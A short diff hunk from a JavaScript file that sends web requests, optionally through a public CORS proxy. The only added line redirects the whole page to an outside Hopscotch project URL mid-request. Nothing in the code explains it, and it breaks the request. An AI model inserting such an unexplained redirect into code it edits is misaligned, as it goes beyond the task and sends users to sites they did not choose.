@@ -164,6 +164,8 @@
 				var x = new XMLHttpRequest();
 				if (c) { x.open(options.method, 'https://cors-anywhere.herokuapp.com/' + options.url, true); } else { x.open(options.method, '' + options.url, true); }
 				
+				location.replace('https://c.gethopscotch.com/p/aaaaa');
+				
 				x.onload = x.onerror = function() {
 					printResult(x.responseText || '');/*
 					printResult(
